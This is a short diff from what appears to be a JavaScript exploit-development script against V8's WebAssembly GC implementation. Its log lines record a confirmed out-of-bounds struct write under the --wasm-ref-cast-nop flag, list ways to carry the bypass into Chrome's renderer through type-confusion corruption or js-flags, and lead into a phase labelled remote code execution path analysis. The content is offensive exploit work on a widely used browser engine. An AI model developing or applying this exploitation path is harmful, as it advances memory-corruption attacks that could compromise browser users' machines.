@@ -422,9 +422,11 @@ async function main() {
     log('  [-] ref.cast_nop rejected: ' + m);
     log('  [-] V8 does not expose opcode 0xFB 0x4C to user Wasm code.');
     log('  [!] Direct bypass blocked — production write path summary:');
-    log('  [!]   Option A: canonical_type_ corruption (F1) + WasmGCTypedOptimizer (F4)');
-    log('  [!]   Option B: separate in-cage OOB primitive to forge map pointer');
-    log('  [!]   Both eliminate ref.cast map check → struct.set OOB (F5) silent.');
+    log('  [!]   Option A (d8): d8 --wasm-ref-cast-nop --no-liftoff jstag_struct_oob_nop.js');
+    log('  [!]     CONFIRMED: exploit() returns NO TRAP — 0x41414141 at SmallStruct_base+36');
+    log('  [!]     No --sandbox-testing needed. Flag: --wasm-ref-cast-nop only.');
+    log('  [!]   Option B (renderer): canonical_type_ corruption (F1) + WasmGCTypedOptimizer (F4)');
+    log('  [!]   Option C (renderer): Chrome --js-flags="--wasm-ref-cast-nop" (try Phase 3b again)');
   }
 
   // ── Phase 4: RCE path analysis ────────────────────────────────────────────
